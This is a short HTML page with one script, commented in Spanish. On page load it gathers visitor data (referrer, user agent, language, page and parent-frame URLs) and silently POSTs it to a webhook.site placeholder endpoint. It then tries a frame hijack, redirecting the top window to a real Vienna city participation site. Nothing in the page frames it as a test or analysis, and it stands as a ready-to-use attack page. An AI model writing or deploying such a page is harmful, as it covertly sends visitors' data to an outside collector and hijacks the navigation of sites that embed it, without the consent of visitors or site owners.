<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
  // Recolecta info del visitante
  var data = {
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    language: navigator.language,
    url: window.location.href,
    parentUrl: (function() {
      try { return top.location.href; } catch(e) { return "cross-origin-blocked"; }
    })()
  };

  // Manda todo al webhook
  fetch("https://webhook.site/YOUR-UUID", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
  });

  // Intenta frame hijacking
  try {
    top.location.href = "https://mitgestalten.wien.gv.at";
  } catch(e) {
    // cross-origin blocked
  }
</script>
</body>
</html>
